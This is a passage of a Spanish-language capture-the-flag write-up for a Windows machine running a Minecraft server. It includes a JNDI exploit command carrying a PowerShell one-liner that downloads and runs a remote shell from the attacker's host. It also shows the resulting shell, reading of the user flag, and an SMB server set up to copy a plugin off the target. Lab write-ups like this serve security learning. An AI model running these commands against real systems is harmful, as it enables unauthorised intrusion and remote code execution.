<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">❯</span><span style="color:#B56959;--shiki-dark:#C3E88D"> java </span><span style="color:#A65E2B;--shiki-dark:#C3E88D">-jar</span><span style="color:#B56959;--shiki-dark:#C3E88D"> RJNDI.jar </span><span style="color:#A65E2B;--shiki-dark:#C3E88D">-c</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">powershell IEX((New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.92:8000/shell&#39;))</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.14.92</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    The</span><span style="color:#B56959;--shiki-dark:#C3E88D"> shell file contained a copy of the ConPtyShell of AntonioCoco</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Serving</span><span style="color:#B56959;--shiki-dark:#C3E88D"> HTTP on </span><span style="color:#2F798A;--shiki-dark:#F78C6C">0.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0.0 port </span><span style="color:#2F798A;--shiki-dark:#F78C6C">8001</span><span style="color:#B56959;--shiki-dark:#C3E88D"> (http://0.0.0.0:8001/) ...</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.10.11.249</span><span style="color:#B56959;--shiki-dark:#C3E88D"> - - [17/Jun/2024 </span><span style="color:#2F798A;--shiki-dark:#F78C6C">10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:58:49] </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">GET /uwu HTTP/1.1</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 200</span><span style="color:#B56959;--shiki-dark:#C3E88D"> -</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.10.11.249</span><span style="color:#B56959;--shiki-dark:#C3E88D"> - - [17/Jun/2024 </span><span style="color:#2F798A;--shiki-dark:#F78C6C">10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:58:51] </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">GET /uwu HTTP/1.1</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 200</span><span style="color:#B56959;--shiki-dark:#C3E88D"> -</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.10.11.249</span><span style="color:#B56959;--shiki-dark:#C3E88D"> - - [17/Jun/2024 </span><span style="color:#2F798A;--shiki-dark:#F78C6C">10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:58:52] </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">GET /uwu HTTP/1.1</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 200</span><span style="color:#B56959;--shiki-dark:#C3E88D"> -</span></span></code></pre> 
<p>Con el terminal que recibimos de la máquina, ya podemos hacer cosas:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\users\svc_minecraft\server</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> ls </span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">    Directory: C:\users\svc_minecraft\server</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Mode                LastWriteTime         Length Name</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#999999;--shiki-dark:#89DDFF">                -------------</span><span style="color:#999999;--shiki-dark:#89DDFF">         ------</span><span style="color:#999999;--shiki-dark:#89DDFF"> ----</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">d</span><span style="color:#999999;--shiki-dark:#89DDFF">-----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">        6</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">17</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2024</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   3</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">01</span><span style="color:#393A34;--shiki-dark:#BABED8"> AM                logs</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">d</span><span style="color:#999999;--shiki-dark:#89DDFF">-----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       10</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">27</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2023</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   2</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">48</span><span style="color:#393A34;--shiki-dark:#BABED8"> PM                plugins</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">d</span><span style="color:#999999;--shiki-dark:#89DDFF">-----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">        6</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">17</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2024</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   7</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">58</span><span style="color:#393A34;--shiki-dark:#BABED8"> AM                world</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">a</span><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       11</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">14</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2023</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  10</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">00</span><span style="color:#393A34;--shiki-dark:#BABED8"> PM              </span><span style="color:#2F798A;--shiki-dark:#F78C6C">2</span><span style="color:#393A34;--shiki-dark:#BABED8"> banned</span><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">ips.json</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">a</span><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       11</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">14</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2023</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  10</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">00</span><span style="color:#393A34;--shiki-dark:#BABED8"> PM              </span><span style="color:#2F798A;--shiki-dark:#F78C6C">2</span><span style="color:#393A34;--shiki-dark:#BABED8"> banned</span><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">players.json</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">a</span><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       10</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">24</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2023</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   1</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">48</span><span style="color:#393A34;--shiki-dark:#BABED8"> PM            </span><span style="color:#2F798A;--shiki-dark:#F78C6C">183</span><span style="color:#393A34;--shiki-dark:#BABED8"> eula.txt</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">a</span><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       11</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">14</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2023</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  11</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">22</span><span style="color:#393A34;--shiki-dark:#BABED8"> PM              </span><span style="color:#2F798A;--shiki-dark:#F78C6C">2</span><span style="color:#393A34;--shiki-dark:#BABED8"> ops.json</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">a</span><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       10</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">24</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2023</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   1</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">43</span><span style="color:#393A34;--shiki-dark:#BABED8"> PM       </span><span style="color:#2F798A;--shiki-dark:#F78C6C">37962360</span><span style="color:#393A34;--shiki-dark:#BABED8"> server.jar</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">a</span><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       11</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">14</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2023</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  10</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">00</span><span style="color:#393A34;--shiki-dark:#BABED8"> PM           </span><span style="color:#2F798A;--shiki-dark:#F78C6C">1130</span><span style="color:#393A34;--shiki-dark:#BABED8"> server.properties</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">a</span><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">        6</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">17</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2024</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   7</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">56</span><span style="color:#393A34;--shiki-dark:#BABED8"> AM            </span><span style="color:#2F798A;--shiki-dark:#F78C6C">102</span><span style="color:#393A34;--shiki-dark:#BABED8"> usercache.json</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">a</span><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       10</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">24</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2023</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   1</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">51</span><span style="color:#393A34;--shiki-dark:#BABED8"> PM              </span><span style="color:#2F798A;--shiki-dark:#F78C6C">2</span><span style="color:#393A34;--shiki-dark:#BABED8"> whitelist.json</span></span></code></pre> 
<p>Y en la carpeta Desktop de la carpeta personal encontraremos la primera bandera.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\users\svc_minecraft\server</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> cd ..</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\users\svc_minecraft</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> cd Desktop</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\users\svc_minecraft\Desktop</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> dir</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">    Directory: C:\users\svc_minecraft\Desktop</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Mode                LastWriteTime         Length Name</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#999999;--shiki-dark:#89DDFF">                -------------</span><span style="color:#999999;--shiki-dark:#89DDFF">         ------</span><span style="color:#999999;--shiki-dark:#89DDFF"> ----</span><span style="color:#393A34;--shiki-dark:#BABED8">                                                                                               </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">ar</span><span style="color:#999999;--shiki-dark:#89DDFF">---</span><span style="color:#2F798A;--shiki-dark:#F78C6C">        6</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">17</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2024</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   3</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">02</span><span style="color:#393A34;--shiki-dark:#BABED8"> AM             </span><span style="color:#2F798A;--shiki-dark:#F78C6C">34</span><span style="color:#393A34;--shiki-dark:#BABED8"> user.txt                                                                                           </span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\users\svc_minecraft\Desktop</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> type user.txt</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">2a6867d4f2483f2e715097acc3</span><span style="color:#999999;--shiki-dark:#89DDFF">******</span></span></code></pre> 
<h1 id="privilege-escalation">Privilege escalation</h1>
<p>En la carpeta plugins del servidor, hay un plugin que no parece ser de terceros como SpigotMC o Modrinth. Es algo personalizado…</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\users\svc_minecraft\server\plugins</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> ls</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">    Directory: C:\users\svc_minecraft\server\plugins</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Mode                LastWriteTime         Length Name</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#999999;--shiki-dark:#89DDFF">                -------------</span><span style="color:#999999;--shiki-dark:#89DDFF">         ------</span><span style="color:#999999;--shiki-dark:#89DDFF"> ----</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">a</span><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       10</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">27</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2023</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   2</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">48</span><span style="color:#393A34;--shiki-dark:#BABED8"> PM           </span><span style="color:#2F798A;--shiki-dark:#F78C6C">9996</span><span style="color:#393A34;--shiki-dark:#BABED8"> playercounter</span><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1.0</span><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">SNAPSHOT.jar</span></span></code></pre> 
<p>Podemos copiarlo a nuestro ordenador configurando un servidor SMB con la herramienta smbserver.py de impacket</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">❯</span><span style="color:#B56959;--shiki-dark:#C3E88D"> doas</span><span style="color:#B56959;--shiki-dark:#C3E88D"> smbserver.py</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -smb2support</span><span style="color:#B56959;--shiki-dark:#C3E88D"> shell</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">doas</span><span style="color:#393A34;--shiki-dark:#BABED8"> (vzon@pwnedz0n) password: </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Impacket</span><span style="color:#B56959;--shiki-dark:#C3E88D"> v0.9.24</span><span style="color:#B56959;--shiki-dark:#C3E88D"> -</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Copyright</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2021</span><span style="color:#B56959;--shiki-dark:#C3E88D"> SecureAuth</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Corporation</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> Config file parsed</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> Callback added </span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">for</span><span style="color:#393A34;--shiki-dark:#BABED8"> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> Callback added </span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">for</span><span style="color:#393A34;--shiki-dark:#BABED8"> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> Config file parsed</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> Config file parsed</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> Config file parsed</span></span></code></pre> 
<p>Pero hay un problema…</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\users\svc_minecraft\server\plugins</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> copy playercounter</span><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1.0</span><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">SNAPSHOT.jar \\</span><span style="color:#2F798A;--shiki-dark:#F78C6C">10.10</span><span style="color:#393A34;--shiki-dark:#BABED8">.</span><span style="color:#2F798A;--shiki-dark:#F78C6C">14.92</span><span style="color:#393A34;--shiki-dark:#BABED8">\uwu\playercounter.jar</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">copy : You can</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">t access this shared folder because your organization</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#393A34;--shiki-dark:#BABED8">s security policies block unauthenticated guest access. These policies help  </span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">protect your PC </span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">from</span><span style="color:#393A34;--shiki-dark:#BABED8"> unsafe or malicious devices on the network.</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">At line:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#393A34;--shiki-dark:#BABED8"> char:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span></span>
